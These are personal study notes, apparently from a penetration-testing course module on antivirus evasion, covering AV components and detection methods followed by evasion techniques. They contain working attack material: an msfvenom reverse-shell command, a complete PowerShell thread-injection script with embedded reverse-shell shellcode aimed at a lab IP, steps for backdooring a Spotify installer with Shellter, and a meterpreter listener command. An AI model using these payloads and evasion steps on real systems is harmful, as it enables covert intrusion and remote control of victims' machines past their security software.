# Antivirus Software Key Components and Operations

## Known vs Unknown Threats

- VirusTotal
	- malware search engine
- Usually have ML Engine
	- must be connected online
- EDR (Endpoint Detation and Response)
	- Responsible for generating security-event telemetry and forwarding it to a _Security Information and Event Management_ (SIEM)[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/antivirus-software-key-components-and-operations/known-vs-unknown-threats#fn6) system, which collects data from every company host.

### AV Engines and Components
- fueled by signature updates fetched from the vendors signature database on the internet.
- Components
	- File Engine
		- scheduled and real-time file scans
		- real time requires kernel level scanner via mini-filter driver
	- Memory Engine
		- each process's memory space at runtime or suspicious API calls that might result in memory injection attacks
	- Network Engine
		- incoming/outgoing network traffic
		- if signature matched, might attempt to block malware C2
	- Disassembler
		- if trying to encrypt malware, AV can disassembling malware packers or ciphers & loading into sandbox or emulator
		- translate machine code into assembly language, reconstructing the orignal program section, and identifying any encoding/decoding routine
	- Emulator/Sandbox
		- runs malware to detect signatures
	- Browser Plugin
		- to detect malware that might be executed in the browser (Sandboxed)
	- Machine Learning Engine
		- in the cloud

### Detection Methods
- Signature-based Detection
	- restricted list technology
		- file system is scanned for known malware signatures, if detected, files are quarantined
		- signature can be just as simple as the hash of the file itself or a set of multiple patterns
		- Example:
			- xxd -b malware.txt
			- ```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010    
``
- xxd
	- left = binary offset, middle = binary representation, right = ASCII
	- sha256sum malware.txt
- Heuristic-based Detection
	- relies on various rules and algorithms to determine whether or not an action is considered malicious
	- achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code
	- search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.
- Behavioral Detection
	- dynamically analyzes the behavior of a binary file
	- often achieved by executing the file in question in an emulated environment,and searching for behaviors or actions that are considered malicious.
- Machine Learning Detection
	- detect unknown threats by collecting and analyzing additional metadata.
	- Microsft Windows Defender
		- client ML Engine
			- creating ML models and heuristics
		- cloud ML engine
			- capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
- Windows msfvenom example
	- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=5555 -f exe > binary.exe
### On-Disk Evasion
- packers
	- reduce the size of an executable
	- new hash signature and as a result, can effectively bypass older and more simplistic AV scanners
- Obfuscators
	- reorganize and mutate code
	- replacing instructions with semantically equivalent ones, inserting irrelevant instructions or _dead code_,[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/antivirus-evasion/bypassing-antivirus-detections/on-disk-evasion#fn3) splitting or reordering functions
	- modern ones can run in-memory
- Crypter
	- alters executable code, adding a decryption stub that restores the original code upon execution
	- decryption happens in-memory
	- encrypted code is the only thing on-disk
	- most effective
- anti-reversing
- anti-debugging
- virtual machine emulation detection
- anti-copy
- The Enigma Protector
	- commerical tool for bypassing AVs

### In-Memory Evasion
- In-memory Injections = PE injections
- Remote Process Memory Injection
	- inject the payload into another valid PE that is not malicious
	1. Windows APIs
	2. use OpenProcess to obtain a valid HANDLE
	3. get valid HANDLE to target process we have permissions to
	4. allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx
	5. copy malicious payload to newly allocated memory using WriteProcessMemory
	6. execute in memory in a seperate thread using CreateRemoteThread
- Reflective DLL Injection
	- load a DLL stored by the attacker in the process memory
	- challenge
		- LoadLibrary does not support in-memory
		- must write their own version of the API that does not rely on a disk-based DLL
- Process Hollowing
	- launch a non-malicious process in a suspended state
	- the image of the process is removed from memory and replaced with a malicious executable image
	- the process is then resumed and malicious code is executed instead of the legitimate proces
- Inline hooking
		- employed by rootkits
			- dedicated and persistent access to the target system through modification of system components in user space, kernel, or even at lower OS protection rings13 such as boot or hypervisor
		
	- modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code
	- Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed
### Testing for AV Evasion
- VirusTotal
	- *CAUTION* - sends malware signature to other vendors so AVs can be updated
	- may cause AV to block your new malware
- AntiScan.Me
	- claims it does not divulge any samples
- If TGT environment specifics are known
	- build a dedicated VM that resembles the customer environment
	- test
- Disable AV Automatic Sample Submission in Windows
	- Windows Security > Virus & threat protection > Manage Settings
- No internet = some advanced AV features inhibited

### Evading AV with Thread Injection

- script > PE
	- script = non-binary file kinda
Example:
- Using remote process memory injection
	- ```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
``
- Change GPO policy of current user in Windows
	- (Using Powershell)
	- Get policy
		- Get-ExecutionPolicy -Scope CurrentUser
	- Set policy
		- Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

### Automating AV Evasion
- Shellter
	- designed to run on windows
	- dynamic shellcode injection tool 
		1.  uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload
		2.  performs a thorough analysis of the target PE file and the execution paths
		3.  determines where it can inject our shellcode without relying on traditional injection techniques
		4. attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload
	- shelter pro = even more bad ass
	- example:
		1. apt-cache search shellter
		2.  sudo apt install shellter
			- /usr/share/windows-resources/shellter/shellter.exe
		3. add installer location of PE
			- **/home/kali/desktop/spotifysetup.exe**
		4. Stealth Mode
			- attempts to restore the execution flow of the PE post exploit
			- custom payloads need to terminate by exiting the current thread
		5. Set parameters
		6. Shelter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload
		7. Configure listener on Kali with the meterpreter payload.
			- msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;
		8. transfer backdoored installer over to the TGT
			- Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE
- FTP
	- set FTP session to active
		- -A
	- set FTP session to anonymous
		- -a
	- local pwd
		- lpwd
	- change directory on the local machine
		- lcd
	- change directory on the target machine
		- cd
	- copy file from remote to local machine
		- get
		- mget
	- copy file from local to remote machine
		- put
		- mput
	- enable binary
		- -binary?
		- ;type=I
			- I = binary??
- ss
	- view open ports [linux]
	
		